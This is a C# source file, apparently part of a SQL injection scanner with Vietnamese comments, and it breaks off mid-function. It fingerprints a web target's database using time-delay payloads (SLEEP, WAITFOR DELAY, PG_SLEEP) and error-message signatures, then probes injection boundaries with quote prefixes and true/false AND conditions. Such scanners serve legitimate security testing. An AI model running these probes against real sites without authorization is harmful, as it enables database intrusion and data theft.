using AngleSharp.Html.Parser;
using Microsoft.VisualBasic;
using SQLiScanner.Models;
using SQLiScanner.Models.Enums;
using SQLiScanner.Services;
using SQLiScanner.Utilities;
using SQLiScanner.Utility;
using System.Net;
using System.Net.Http.Headers;
using System.Reflection.PortableExecutable;
using System.Text;
using System.Text.RegularExpressions;

namespace SQLiScanner.Modules
{
    public enum ParameterPriority
    {
        QueryOrFormOnly,
        CookieOverride,
        Uncertain
    }

    public class ContextAnalyzer
    {
        private readonly IRequestDispatcher _requestService;
        private readonly string _boundariesXmlPath;
        private readonly string _errorBasedXmlPath;
        private readonly string _booleanBlindXmlPath;
        private readonly string _timeBlindXmlPath;

        private static readonly Dictionary<string, Regex> ErrorSignatures = new Dictionary<string, Regex>(StringComparer.OrdinalIgnoreCase)
        {
            {
                "SQLite",
                new Regex(@"unrecognized token|incomplete input|SQLiteException|SQLite[ _-]Driver|System\.Data\.SQLite", RegexOptions.IgnoreCase | RegexOptions.Compiled)
            },
            {
                "MySQL",
                new Regex(@"SQL syntax.*MySQL|Warning.*mysql_.*|MySqlClient\.|right syntax to use near", RegexOptions.IgnoreCase | RegexOptions.Compiled)
            },
            {
                "MSSQL",
                new Regex(@"Driver.*SQL[-_ ]*Server|OLE DB.*SQL Server|System\.Data\.SqlClient\.|Unclosed quotation mark after the character string", RegexOptions.IgnoreCase | RegexOptions.Compiled)
            },
            {
                "Oracle",
                new Regex(@"ORA-[0-9]{4,5}|Oracle.*Driver|quoted string not properly terminated", RegexOptions.IgnoreCase | RegexOptions.Compiled)
            },
            {
                "PostgreSQL",
                new Regex(@"PostgreSQL.*ERROR|Warning.*\Wpg_.*|Npgsql\.|unterminated quoted string", RegexOptions.IgnoreCase | RegexOptions.Compiled)
            }
        };

        public const string INT_PAYLOAD_1 = "1";
        public const string INT_PAYLOAD_2 = "1-1";
        public const string INT_PAYLOAD_3 = "2-1";

        public ContextAnalyzer(IRequestDispatcher requestService)
        {
            string baseDir = AppDomain.CurrentDomain.BaseDirectory;

            _requestService = requestService;
            _boundariesXmlPath = Path.Combine(baseDir, "Resources", "boundaries.xml");
            _errorBasedXmlPath = Path.Combine(baseDir, "Resources", "AnalyzingPayloads", "error_based.xml");
            _booleanBlindXmlPath = Path.Combine(baseDir, "Resources", "AnalyzingPayloads", "boolean_blind.xml");
            _timeBlindXmlPath = Path.Combine(baseDir, "Resources", "AnalyzingPayloads", "time_blind.xml");
        }

        public async Task<HeuristicResult> PerformHeuristicScanAsync(
            CrawlResult target, string paramName, ScanConfig config)
        {
            string originalValue = target.Params.TryGetValue(paramName, out var bodyVal)
                ? bodyVal
                : (System.Web.HttpUtility.ParseQueryString(target.RawQueryString)[paramName] ?? "");

            var result = new HeuristicResult();

            try
            {
                InjectionRoute route = InjectionRoute.CreateStandard(paramName, originalValue);

                config.OnProgress?.Invoke("Đang tải cấu trúc trang gốc (Baseline)...");
                var (baseHtml, baseBytes, baseStatus, _, baseHeaders) = await _requestService.RequestAsync(target, originalValue, route, config.Token);
                if (baseBytes == null)
                {
                    result.Status = "FAILED";
                    config.OnProgress?.Invoke("Lỗi: Không lấy được Baseline (WAF/Drop)");
                    return result;
                }

                config.OnProgress?.Invoke("Đang tự động đo đạc độ nhiễu nền trang (Calibration)...");
                var (baseHtml2, baseBytes2, baseStatus2, _, _) = await _requestService.RequestAsync(target, originalValue, route, config.Token);

                if (baseBytes2 != null)
                {
                    double baselineSimilarity = CalculateSimilarity(
                        baseStatus, baseBytes.Length, baseHtml,
                        baseStatus2, baseBytes2.Length, baseHtml2
                    );

                    double backgroundNoise = 1.0 - baselineSimilarity;
                    target.PageTolerance = backgroundNoise + 0.05;

                    if (backgroundNoise > 0.30)
                    {
                        config.OnProgress?.Invoke($"[!] Cảnh báo: Trang web rất hỗn loạn! Độ nhiễu nền đo được: {(backgroundNoise * 100):F1}%. Ngưỡng dung sai động được nâng lên: {(target.PageTolerance * 100):F1}%");
                    }
                    else
                    {
                        config.OnProgress?.Invoke($"[*] Đo đạc độ nhiễu trang thành công: {(backgroundNoise * 100):F2}%. Ngưỡng dung sai động được thiết lập: {(target.PageTolerance * 100):F2}%");
                    }
                }
                else
                {
                    target.PageTolerance = 0.05;
                }

                config.OnProgress?.Invoke("Đang dò cookie thụ động...");
                var passiveCookies = MinePassiveCookie(baseHtml, baseHeaders);

                config.OnProgress?.Invoke("Đang dò cookie bằng Fuzzing...");
                var activeCookies = await MineActiveCookiesAsync(target, baseHtml, originalValue, baseStatus, baseBytes.Length, config.Token);

                // Gộp danh sách Cookie từ 2 lần dò trên
                var minedCookies = new HashSet<string>(passiveCookies, StringComparer.OrdinalIgnoreCase);
                minedCookies.UnionWith(activeCookies);

                if (minedCookies.Count > 0)
                {
                    config.OnProgress?.Invoke($"Tìm thấy {minedCookies.Count} Cookies hoạt động: {string.Join(", ", minedCookies)}");
                }

                config.OnProgress?.Invoke($"Đang chạy Cookie Aliasing cho [{paramName}]...");
                route = await CheckCookieAliasingAsync(target, paramName, minedCookies, config.Token);

                result.Route = route;

                string canary = ReflectionDetector.GenerateCanaryToken();

                config.OnProgress?.Invoke($"Kiểm tra XSS: Gửi token {canary}");
                var (canaryHtml, canaryBytes, _, _, _) = await _requestService.RequestAsync(target, canary, route, config.Token);

                if (canaryBytes != null)
                {
                    if (ReflectionDetector.IsPayloadReflected(canaryHtml, canary))
                    {
                        result.IsReflected = true;
                        result.CanaryToken = canary;
                        config.OnProgress?.Invoke("XSS/Reflected: Phát hiện rò rỉ đầu vào");
                    }
                }

                if (result.IsCookiePriority)
                {
                    config.OnProgress?.Invoke($"ĐỊNH TUYẾN MỚI: Server ưu tiên Cookie cho [{paramName}]. Kích hoạt định tuyến Payload vào Header!");
                }
                else
                {
                    config.OnProgress?.Invoke($"[-] Định tuyến bình thường: Sử dụng tham số URL/Form để truyền Payload.");
                }

                result.TargetDBMS = await DetectDbmsViaWafAsync(target, route, config);

                config.OnProgress?.Invoke($"XÁC ĐỊNH NGỮ CẢNH CỦA {target.BaseUrl} (Tham số: {paramName})");
                // PHASE 1: Kiểm tra ngữ cảnh là INTEGER
                config.OnProgress?.Invoke("Kiểm tra ngữ cảnh integer...");
                await Phase1_DetectIntegerContextAsync(target, result, route, config);

                if (result.DetectedType != "INTEGER")
                {
                    // PHASE 2: Kiểm tra liệu ngữ cảnh có phải là string-like
                    config.OnProgress?.Invoke("[PHASE 2] KIỂM TRA NGỮ CẢNH STRING THÔNG QUA ERROR-BASED");
                    await Phase2_DetectStringContextAsync(
                        target, baseStatus, baseBytes.Length, baseHtml,
                        result, route, config
                    );
                }


                if (result.ApplicableBoundaries.Count > 0)
                {
                    // PHASE 3: Xác định ngữ cảnh
                    config.OnProgress?.Invoke("[PHASE 3] XÁC ĐỊNH CHÍNH XÁC BOUNDARY");
                    await Phase3_VerifyBoundaryAsync(
                        target, baseStatus, baseBytes.Length, baseHtml,
                        result, route, config
                    );
                }

                if (!result.IsReadyForDetection)
                {
                    config.OnProgress?.Invoke($"Không tìm được boundary bằng Heuritic. Buộc load hết toàn bộ boundaries và Payload");
                    result.Status = "UNCERTAIN";
                    result.ApplicableBoundaries = await GetAllApplicableBoundaries();
                    await LoadApplicablePayloadsAsync(result);
                }

                return result;
            }
            catch (Exception ex)
            {
                // Nếu xảy ra lỗi thì load toàn bộ boundary và payload
                config.OnProgress?.Invoke($"Lỗi nghiêm trọng tại ContextAnalyzer: {ex.Message}");
                result.Status = "FAILED";

                result.ApplicableBoundaries = await GetAllApplicableBoundaries();
                await LoadApplicablePayloadsAsync(result);
                return result;
            }
        }

        private async Task<List<Boundary>> GetBoundariesByPType(int ptype)
        {
            try
            {
                var allBoundaries = await PayloadLoader.LoadBoundariesAsync(_boundariesXmlPath);

                return allBoundaries
                    .Where(b => b.PType == ptype)
                    .OrderBy(b => b.Level)
                    .ToList();
            }
            catch
            {
                // Lấy Boundary cứng nếu như load fail
                return GetHardcodedBoundaries(ptype);
            }
        }

        private List<Boundary> GetHardcodedBoundaries(int ptype)
        {
            return ptype switch
            {
                1 => new() // INTEGER
                {
                    new Boundary
                    {
                        Level = 1,
                        Clause = "1",
                        Where = "1",
                        PType = 1,
                        Prefix = "",
                        Suffix = "",
                        ContextName = "INTEGER"
                    }
                },

                2 => new() // STRING_SINGLE_QUOTE
                {
                    new Boundary
                    {
                        Level = 1,
                        Clause = "1",
                        Where = "1",
                        PType = 2,
                        Prefix = "'",
                        Suffix = "--",
                        ContextName = "STRING_SINGLE_QUOTE"
                    },
                    new Boundary
                    {
                        Level = 1,
                        Clause = "1",
                        Where = "1",
                        PType = 2,
                        Prefix = "'",
                        Suffix = "AND '1'='1",
                        ContextName = "STRING_SINGLE_QUOTE_AND"
                    }
                },

                3 => new() // LIKE_SINGLE_QUOTE
                {
                    new Boundary
                    {
                        Level = 2,
                        Clause = "1",
                        Where = "1",
                        PType = 3,
                        Prefix = "%'",
                        Suffix = "AND '%'='",
                        ContextName = "LIKE_SINGLE_QUOTE"
                    }
                },

                _ => new() // Default: Empty
            };
        }

        private List<Boundary> GetNestedParenthesisBoundaries()
        {
            return new()
            {
                new Boundary
                {
                    Level = 2,
                    Clause = "1",
                    Where = "1",
                    PType = 1, // Coi như numeric
                    Prefix = "')",
                    Suffix = "AND ('1'='1",
                    ContextName = "NESTED_PARENTHESIS"
                },
                new Boundary
                {
                    Level = 2,
                    Clause = "1",
                    Where = "1",
                    PType = 1,
                    Prefix = "')",
                    Suffix = "--",
                    ContextName = "NESTED_PARENTHESIS_COMMENT"
                }
            };
        }

        public async Task<List<PayloadType>> LoadPayloadsByType(int stype = 0)
        {
            var allPayloads = new List<PayloadType>();

            try
            {
                // Load error-based payloads
                if (stype == 0 || stype == 2)
                    allPayloads.AddRange(await PayloadLoader.LoadPayloadAsync(_errorBasedXmlPath, 2));

                // Load boolean-based payloads
                if (stype == 0 || stype == 1)
                    allPayloads.AddRange(await PayloadLoader.LoadPayloadAsync(_booleanBlindXmlPath, 1));

                // Load time-based payloads
                if (stype == 0 || stype == 5)
                    allPayloads.AddRange(await PayloadLoader.LoadPayloadAsync(_timeBlindXmlPath, 5));

                return allPayloads.ToList();
            }
            catch (Exception)
            {
                return new List<PayloadType>();
            }
        }

        #region Các hàm phụ trợ
        private async Task<string> DetectDbmsViaWafAsync(
            CrawlResult target, InjectionRoute route, ScanConfig config)
        {
            config.OnProgress?.Invoke("Đoán DBMS qua phản ứng của WAF...");

            var tests = new (string DBMS, string NakedPayload)[]
            {
                ("MySQL", " SLEEP(5)"),
                ("MSSQL", " WAITFOR DELAY '0:0:5'"),
                ("PostgreSQL", " PG_SLEEP(5)"),
                ("Oracle", " DBMS_PIPE.RECEIVE_MESSAGE('a',5)"),
            };
            var results = new List<(string DBMS, int StatusCode)>(4);
            foreach (var test in tests)
            {
                if (config.Token.IsCancellationRequested)
                {
                    return "UNKNOWN";
                }

                string payload = $"{route.OriginalValue}{test.NakedPayload}";
                config.OnProgress?.Invoke($"[WAF Fingerprint] Đang gửi thử nghiệm cho {test.DBMS}...");

                try
                {
                    var (_, bytes, statusCode, _, _) = await _requestService.RequestAsync(target, payload, route, config.Token);

                    if (bytes != null)
                    {
                        results.Add((test.DBMS, statusCode));
                        config.OnProgress?.Invoke($"[WAF Fingerprint] Phản hồi {test.DBMS}: HTTP Status {statusCode}");
                    }
                    else
                    {
                        results.Add((test.DBMS, 0));
                        config.OnProgress?.Invoke($"[WAF Fingerprint] Phản hồi {test.DBMS}: HTTP Status {statusCode}. Nghi vấn Time-based");
                    }
                }
                catch (Exception ex)
                {
                    results.Add((test.DBMS, 0));
                    config.OnProgress?.Invoke($"[WAF Fingerprint] Gửi payload {test.DBMS} thất bại do ngoại lệ: {ex.Message}");
                }
            }
            var blockedDbmsList = results.Where(r => r.StatusCode == 403 || r.StatusCode == 406).ToList();
            var timeOutList = results.Where(r => r.StatusCode == 0).ToList();
            // Nếu có điẻm khác biệt thì chốt luôn
            if (blockedDbmsList.Count == 1)
            {
                string detectedDbms = blockedDbmsList[0].DBMS;
                config.OnProgress?.Invoke($"[WAF Fingerprint] ĐÃ NHẬN DIỆN: Chỉ duy nhất payload của [{detectedDbms}] bị WAF chặn (Status {blockedDbmsList[0].StatusCode})!");
                return detectedDbms;
            }
            // Nghi vấn time-based do chỉ có một đối tượng không trả về status code
            if (timeOutList.Count == 1)
            {
                string detectedDbms = timeOutList[0].DBMS;
                config.OnProgress?.Invoke($"[WAF Fingerprint] ĐÃ NHẬN DIỆN: Chỉ duy nhất payload của [{detectedDbms}] bị time-out!");
                return detectedDbms;
            }
            config.OnProgress?.Invoke("[WAF Fingerprint] Không phát hiện sự phản ứng phân biệt rõ ràng nào từ phía WAF. Trả về UNKNOWN.");
            return "UNKNOWN";
        }

        private async Task Phase1_DetectIntegerContextAsync(
            CrawlResult target, HeuristicResult result,
            InjectionRoute route, ScanConfig config)
        {
            // Lấy base response
            config.OnProgress?.Invoke("Kiểm tra tham số với giá trị = 1");
            var (baselineHtml, baselineBytes, baselineStatus, _, _) =
                await _requestService.RequestAsync(target, INT_PAYLOAD_1, route, config.Token);
            if (baselineBytes == null)
            {
                result.DetectedType = "UNKNOWN";
                result.ConfidenceScore = 0;
                return;
            }

            int baselineLength = baselineBytes.Length;

            // Test payloa False
            config.OnProgress?.Invoke("Kiểm tra tham số với giá trị = 1-1");
            var (falseHtml, falseBytes, falseStatus, _, _) =
                await _requestService.RequestAsync(target, INT_PAYLOAD_2, route, config.Token);

            if (falseBytes == null)
            {
                result.DetectedType = "UNKNOWN";
                result.ConfidenceScore = 0;
                config.OnProgress?.Invoke("Không nhận được phản hồi từ đối tượng. Kiểm tra Phase 1 thất bại!");
                return;
            }

            // Test payload 3
            config.OnProgress?.Invoke("Kiểm tra tham số với giá trị = 2-1");
            var (trueHtml, trueBytes, trueStatus, _, _) =
                await _requestService.RequestAsync(target, INT_PAYLOAD_3, route, config.Token);
            if (trueBytes == null)
            {
                result.DetectedType = "UNKNOWN";
                result.ConfidenceScore = 0;
                return;
            }


            config.OnProgress?.Invoke("Đang mong chờ phản hồi có payload (2-1) sẽ giống (1) và ngược lại đối với (1-1) sẽ không giống (1)");
            // Nếu cả base và payload 2 và 3 đều giống nhau thì tham số là Integer
            double similarityPayloadFalse = CalculateSimilarity(
                baselineStatus, baselineLength, baselineHtml,
                falseStatus, falseBytes.Length, falseHtml,
                target.PageTolerance);
            config.OnProgress?.Invoke($"Payload (1-1) giống {(similarityPayloadFalse * 100):F1}% so với Payload (1)");

            double similarityPayloadTrue = CalculateSimilarity(
                baselineStatus, baselineLength, baselineHtml,
                trueStatus, trueBytes.Length, trueHtml,
                target.PageTolerance
            );
            config.OnProgress?.Invoke($"Payload (2-1) giống {similarityPayloadFalse * 100}% so với Payload (1)");

            result.Similarity = Math.Max(similarityPayloadFalse, similarityPayloadTrue);

            // Ngưỡng mức chấp nhận cho Integer (> 95% -> Integer)
            double INTEGER_THRESHOLD = 1.0 - target.PageTolerance;
            config.OnProgress?.Invoke($"Đặt ngưỡng mức trùng nhau là {INTEGER_THRESHOLD * 100}%, sai số {((1.0 - INTEGER_THRESHOLD) * 100):F1}%");
            // Nếu payload 2 - 1 (giống base = 1) trả về như base thì chắc chắn server thực hiện phép trừ và có thể kết luận ngữ cảnh là Integer
            if (similarityPayloadTrue > INTEGER_THRESHOLD && similarityPayloadFalse < INTEGER_THRESHOLD)
            {
                config.OnProgress?.Invoke($"THÀNH CÔNG PHÁT HIỆN: INTEGER (ĐIỂM: {result.ConfidenceScore}%)");
                config.OnProgress?.Invoke("Cần phải trải qua PHASE 3 để xác định BOUNDARY CHÍNH XÁC.");
                result.DetectedType = "INTEGER";
                result.ConfidenceScore = (int)Math.Min(100, (result.Similarity * 100));
                result.ApplicableBoundaries = await GetBoundariesByPType(1);
                return;
            }

            result.DetectedType = "UNCERTAIN";
            result.ConfidenceScore = 0;

            config.OnProgress?.Invoke("Không thể là INTEGER - Chuyển sang kiểm tra ngữ cảnh STRING-LIKE ở Phase 2");
            return;
        }

        private async Task Phase2_DetectStringContextAsync(
            CrawlResult target,
            int baselineStatus, int baselineLength, string baselineHtml,
            HeuristicResult result, InjectionRoute route, ScanConfig config)
        {
            config.OnProgress?.Invoke("KỲ VỌNG: Cố tình chèn các Prefix gây lỗi, nếu như đúng là ngữ cảnh STRING thì sẽ báo về lỗi");
            double STRING_LIKE_THRESHOLD = 1.0 - target.PageTolerance;
            config.OnProgress?.Invoke($"Đặt ngưỡng mức trùng nhau là {STRING_LIKE_THRESHOLD * 100}%, sai số {((1.0 - STRING_LIKE_THRESHOLD) * 100):F1}%");
            var testPayloads = new[]
            {
                $"{route.OriginalValue}'",    // Single quote
                $"{route.OriginalValue}\"",   // Double quote
                $"{route.OriginalValue}%'",    // LIKE pattern single
                $"{route.OriginalValue}%\"",   // LIKE pattern double
                $"{route.OriginalValue}')"     // Nested parenthesis
            };

            foreach (var payload in testPayloads)
            {
                config.OnProgress?.Invoke($"Chèn payload [{payload}]");
                var (testHtml, testBytes, testStatus, _, _) =
                    await _requestService.RequestAsync(target, payload, route, config.Token);

                if (testBytes == null)
                {
                    config.OnProgress?.Invoke("Không nhận được phản hồi từ đối tượng. Chuyển sang Payload khác!");
                    continue;
                }

                // Kiểm tra phản hồi thông báo lỗi có các cú pháp lỗi đặc trưng
                if (!string.IsNullOrEmpty(testHtml) && (result.TargetDBMS == "UNKNOWN" || string.IsNullOrEmpty(result.TargetDBMS)))
                {
                    foreach (var signature in ErrorSignatures)
                    {
                        if (signature.Value.IsMatch(testHtml))
                        {
                            result.TargetDBMS = signature.Key;
                            config.OnProgress?.Invoke($"[Fingerprint] Đã nhận diện được chữ ký lỗi của [{signature.Key}] rò rỉ trên giao diện HTML!");
                            
                            break;
                        }
                    }
                }

                double similarity = CalculateSimilarity(
                    baselineStatus, baselineLength, baselineHtml,
                    testStatus, testBytes.Length, testHtml,
                    target.PageTolerance
                );
                config.OnProgress?.Invoke($"Payload [{payload}] giống {similarity * 100}% so request nguyên bản");

                if (similarity < STRING_LIKE_THRESHOLD)
                {
                    result.DetectedType = "STRING_LIKE";
                    result.ConfidenceScore = (int)((1.0 - similarity) * 100);
                    result.Similarity = similarity * 100;
                    result.ApplicableBoundaries = await GetAllStringLikeBoundaries();

                    config.OnProgress?.Invoke($"PHÁT HIỆN PAYLOAD [{payload}] GÂY LỖI, CHẮC CHẮN LÀ STRING-LIKE - ĐIỂM: {result.ConfidenceScore}%");
                    return;
                }
            }

            result.DetectedType = "UNCERTAIN";
            result.ConfidenceScore = 0;
            result.Similarity = 100;
            result.ApplicableBoundaries = await GetAllApplicableBoundaries();

            config.OnProgress?.Invoke("Không tìm thấy dấu hiệu là string - Cần phải kiểm tra toàn bộ boundary ở Phase 3");
            return;
        }

        private async Task Phase3_VerifyBoundaryAsync(
            CrawlResult target, int baselineStatus, int baselineLength, string baselineHtml,
            HeuristicResult result, InjectionRoute route, ScanConfig config)
        {
            config.OnProgress?.Invoke("KỲ VỌNG: Xác định chính xác boundary thông qua thử từng boundary bằng BOOLEAN LOGIC.");
            if (result.TargetDBMS == "UNKNOWN" || string.IsNullOrEmpty(result.TargetDBMS))
            {
                string detectedDbms = await TryDetectDbmsViaConcatenationAsync(
                    target, route.OriginalValue, baselineStatus, baselineLength, baselineHtml, route, config);

                if (detectedDbms != "UNKNOWN")
                {
                    result.TargetDBMS = detectedDbms;
                    config.OnProgress?.Invoke($"[Phase 3] Xác định sơ bộ CSDL là [{detectedDbms}]. Tiến hành kiểm tra phá vỡ cấu trúc...");
                }
            }

            config.OnProgress?.Invoke("Sử dụng 2 payload True (8341=8341) và False (8341=8342) để kiểm tra các Boundary...");
            double SIMILARITY_THRESHOLD = 1.0 - target.PageTolerance;

            foreach (var boundary in result.ApplicableBoundaries)
            {
                config.OnProgress?.Invoke($"Sử dụng Boundary: {boundary}");
                string trueCondition = "8341=8341";
                string falseCondition = "8341=8342";

                config.OnProgress?.Invoke($"Thiết lặp True Payload (Prefix: [{boundary.Prefix}] | Suffix: [{boundary.Suffix}])");
                string truePayload = $"{route.OriginalValue}{boundary.Prefix} AND {trueCondition} {boundary.Suffix} ";
                config.OnProgress?.Invoke($"Thiết lặp False Payload (Prefix: [{boundary.Prefix}] | Suffix: [{boundary.Suffix}])");
                string falsePayload = $"{route.OriginalValue}{boundary.Prefix} AND {falseCondition} {boundary.Suffix} ";

                // TEST FALSE PAYLOAD (Kỳ vọng: Khác Base)
                config.OnProgress?.Invoke("Gửi False Payload...");
                var (htmlFalse, bytesFalse, statusFalse, _, _) = await _requestService.RequestAsync(target, falsePayload, route, config.Token);
                if (bytesFalse == null)
                {
                    config.OnProgress?.Invoke("Không nhận được phản hồi từ đối tượng. Chuyển sang boundary tiếp theo!");
                    continue;
                }

                double simFalse = CalculateSimilarity(
                    baselineStatus, baselineLength, baselineHtml,
                    statusFalse, bytesFalse.Length, htmlFalse,
                    target.PageTolerance);
                config.OnProgress?.Invoke($"Payload False giống {(simFalse * 100):F1}% so request nguyên bản");

                // TEST TRUE PAYLOAD (Kỳ vọng: Giống Base)
                config.OnProgress?.Invoke("Gửi True Payload...");
                var (htmlTrue, bytesTrue, statusTrue, _, _) = await _requestService.RequestAsync(target, truePayload, route, config.Token);
                if (bytesTrue == null)
                {
                    config.OnProgress?.Invoke("Không nhận được phản hồi từ đối tượng. Chuyển sang boundary tiếp theo!");
                    continue;
                }

                double simTrue = CalculateSimilarity(
                    baselineStatus, baselineLength, baselineHtml,
                    statusTrue, bytesTrue.Length, htmlTrue,
                    target.PageTolerance);
                config.OnProgress?.Invoke($"Payload True giống {simTrue * 100}% so request nguyên bản");

                // Kịch bản 1: True giống Base, False khác Base
                bool isRegularMatch = simTrue >= SIMILARITY_THRESHOLD && simFalse < SIMILARITY_THRESHOLD;
                if (isRegularMatch) config.OnProgress?.Invoke("Phát hiện: True giống Base, False khác Base (Đúng như dự đoán)");

                // Kịch bản 2: False giống Base, True khác Base (Trường hợp Bypass / Original Value là sai)
                bool isInverseMatch = simFalse >= SIMILARITY_THRESHOLD && simTrue < SIMILARITY_THRESHOLD;
                if (isInverseMatch) config.OnProgress?.Invoke("Phát hiện: False giống Base, True khác Base (Trường hợp Bypass / Original Value là sai)");

                // Bổ sung: Đảm bảo độ chênh lệch giữa True và False phải đủ lớn (ví dụ > 5%) để tránh nhiễu
                bool hasSignificantDifference = Math.Abs(simTrue - simFalse) >= target.PageTolerance;

                if ((isRegularMatch || isInverseMatch) && hasSignificantDifference)
                {
                    config.OnProgress?.Invoke($"[SUCCESS] Boundary Worked: {boundary.ContextName}");

                    result.LockedBoundary = boundary;
                    result.ApplicableBoundaries.Clear();
                    result.ApplicableBoundaries.Add(boundary);
                    result.Status = "SUCCESS";

                }

                config.OnProgress?.Invoke($"Boundary {boundary} không có tác dụng.");
                // Load payloads
                await LoadApplicablePayloadsAsync(result);
                return;

            }

            result.Status = "UNCERTAIN";
        }

        private async Task<List<Boundary>> GetAllStringLikeBoundaries()
        {
            try
            {
                var allBoundaries = await PayloadLoader.LoadBoundariesAsync(_boundariesXmlPath);

                // Filter: Chỉ lấy string-like contexts
                var stringLikeBoundaries = allBoundaries
                    .Where(b => b.PType == 2 || b.PType == 3 || b.PType == 4 || b.PType == 5)  // Single quote, Single quote LIKE, double quote, Double quote LIKE
                    .ToList();

                // Lấy Nested context
                stringLikeBoundaries.AddRange(GetNestedParenthesisBoundaries());

                return stringLikeBoundaries
                    .OrderBy(b => b.Level)
                    .ThenBy(b => b.Clause)
                    .ToList();
            }
            catch
            {
                // Fallback
                var boundaries = new List<Boundary>();
                boundaries.AddRange(await GetBoundariesByPType(2));    // Single quote
                boundaries.AddRange(await GetBoundariesByPType(3));    // LIKE
                boundaries.AddRange(GetNestedParenthesisBoundaries()); // Nested
                return boundaries;
            }
        }

        private async Task LoadApplicablePayloadsAsync(HeuristicResult result)
        {
            try
            {
                // Load tất cả 3 loại payloads
                var errorPayloads = await PayloadLoader.LoadPayloadAsync(_errorBasedXmlPath, 2);
                var booleanPayloads = await PayloadLoader.LoadPayloadAsync(_booleanBlindXmlPath, 1);
                var timePayloads = await PayloadLoader.LoadPayloadAsync(_timeBlindXmlPath, 5);

                // Merge
                var allPayloads = new List<PayloadType>();
                allPayloads.AddRange(errorPayloads);
                allPayloads.AddRange(booleanPayloads);
                allPayloads.AddRange(timePayloads);

                IEnumerable<PayloadType> filteredPayloads = allPayloads;
                bool isDbmsIdentified = !string.IsNullOrEmpty(result.TargetDBMS) &&
                               !result.TargetDBMS.Equals("UNKNOWN", StringComparison.OrdinalIgnoreCase);

                if (isDbmsIdentified) 
                {
                    filteredPayloads = allPayloads.Where(p =>
                        p.DBMS.Equals(result.TargetDBMS, StringComparison.OrdinalIgnoreCase) ||
                        // Tính trường hợp các payload dùng chung cho toàn bộ database
                        string.IsNullOrEmpty(p.DBMS) ||
                        p.DBMS.Equals("UNKNOWN", StringComparison.OrdinalIgnoreCase) ||
                        p.DBMS.Equals("GENERIC", StringComparison.OrdinalIgnoreCase)
                    );
                }

                // Sort: Level (easy → hard) then Risk (low → high)
                result.ApplicablePayloads = filteredPayloads
                    .OrderBy(p => p.Level)
                    .ThenBy(p => p.Risk)
                    .ToList();
            }
            catch (Exception) { }
        }
        private async Task<List<Boundary>> GetAllApplicableBoundaries()
        {
            try
            {
                return await PayloadLoader.LoadBoundariesAsync(_boundariesXmlPath);
            }
            catch
            {
                var all = new List<Boundary>();
                all.AddRange(await GetBoundariesByPType(1));
                all.AddRange(await GetBoundariesByPType(2));
                all.AddRange(await GetBoundariesByPType(3));
                return all;
            }
        }

        private double CalculateSimilarity(
            int status1, int length1, string html1,
            int status2, int length2, string html2,
            double tolerancePercent = 0.05)
        {
            // Lọc status code
            if (status1 != status2) return 0.0;

            // Lọc Content-Length
            if (length1 == length2 && html1 == html2) return 1.0;

            int maxLength = Math.Max(length1, length2);
            if (maxLength > 0)
            {
                double diffRatio = (double)Math.Abs(length1 - length2) / maxLength;
                if (diffRatio > tolerancePercent) return 0.0;
            }

            // Lọc nội dung của Response
            string text1 = ExtractPlainText(html1);
            string text2 = ExtractPlainText(html2);

            return CalculateContentSimilarity(text1, text2);
        }

        private double CalculateContentSimilarity(string text1, string text2)
        {
            if (string.IsNullOrEmpty(text1) && string.IsNullOrEmpty(text2)) return 1.0;
            if (string.IsNullOrEmpty(text1) || string.IsNullOrEmpty(text2)) return 0.0;
            if (text1 == text2) return 1.0;
            char[] separator = new[] { ' ' };

            var set1 = new HashSet<string>(text1.Split(separator, StringSplitOptions.RemoveEmptyEntries));
            var set2 = new HashSet<string>(text2.Split(separator, StringSplitOptions.RemoveEmptyEntries));

            int intersectionCount = set1.Intersect(set2).Count();
            int unionCount = set1.Union(set2).Count();

            if (unionCount == 0) return 0.0;
            return (double)intersectionCount / unionCount;
        }

        private string ExtractPlainText(string html)
        {
            if (string.IsNullOrWhiteSpace(html)) return string.Empty;

            // Xóa toàn bộ nội dung trong thẻ script và style
            string result = Regex.Replace(html, @"<script[^>]*>[\s\S]*?</script>", string.Empty, RegexOptions.IgnoreCase);
            result = Regex.Replace(result, @"<style[^>]*>[\s\S]*?</style>", string.Empty, RegexOptions.IgnoreCase);

            // Xóa các comment
            result = Regex.Replace(result, @"<!--[\s\S]*?-->", string.Empty);

            // Xóa tát cả thẻ HTML (<div>, <a>, <img>)
            result = Regex.Replace(result, @"<[^>]+>", " ");

            // Giải mã các kí tự html (&nbsp, &amp, &lt) thành kí tự thật
            result = WebUtility.HtmlDecode(result);

            // Format lại các khoảng trắng/dòng thừa thành 1 khoảng trắng duy nhất
            result = Regex.Replace(result, @"\s+", " ").Trim();

            return result;
        }

        // Tính khoảng cách Levenshtein (Chi phí đổi từ chuỗi A sang chuỗi B)
        private int CalculateLevenshteinDistance(string source, string target)
        {
            if (string.IsNullOrEmpty(source)) return target?.Length ?? 0;
            if (string.IsNullOrEmpty(target)) return source.Length;

            source = source.ToLower();
            target = target.ToLower();

            var v0 = new int[target.Length + 1];
            var v1 = new int[target.Length + 1];

            for (int i = 0; i < v0.Length; i++) v0[i] = i;

            for (int i = 0; i < source.Length; i++)
            {
                v1[0] = i + 1;
                for (int j = 0; j < target.Length; j++)
                {
                    int cost = (source[i] == target[j]) ? 0 : 1;
                    v1[j + 1] = Math.Min(v1[j] + 1, Math.Min(v0[j + 1] + 1, v0[j] + cost));
                }
                for (int j = 0; j < v0.Length; j++) v0[j] = v1[j];
            }
            return v1[target.Length];
        }

        private async Task<bool> IsConcatenationMatchAsync(
            CrawlResult target,
            string payload,
            InjectionRoute route,
            int baselineStatus,
            int baselineLength,
            string baselineHtml,
            CancellationToken cancellationToken)
        {
            var (html, bytes, status, _, _) = await _requestService.RequestAsync(target, payload, route, cancellationToken);
            if (bytes == null) return false;

            double similarity = CalculateSimilarity(
                baselineStatus, baselineLength, baselineHtml,
                status, bytes.Length, html,
                target.PageTolerance);

            double threshold = 1.0 - target.PageTolerance;
            return similarity >= threshold;
        }        

        private async Task<string> TryDetectDbmsViaConcatenationAsync(
            CrawlResult target,
            string originalValue,
            int baselineStatus,
            int baselineLength,
            string baselineHtml,
            InjectionRoute route,
            ScanConfig config)
        {
            if (baselineStatus == 403 || baselineStatus == 406)
            {
                config.OnProgress?.Invoke("[Concatenation] Phản hồi ban đầu bị chặn. Bỏ qua kĩ thuật nối chuỗi");
                return "UNKNOWN";
            }

            if (string.IsNullOrEmpty(originalValue) || originalValue.Length < 2)
            {
                config.OnProgress?.Invoke("[Concatenation] OriginalValue quá ngắn. Bỏ qua kĩ thuật nối chuỗi");
                return "UNKNOWN";
            }

            int mid = originalValue.Length / 2;
            string str1 = originalValue.Substring(0, mid);
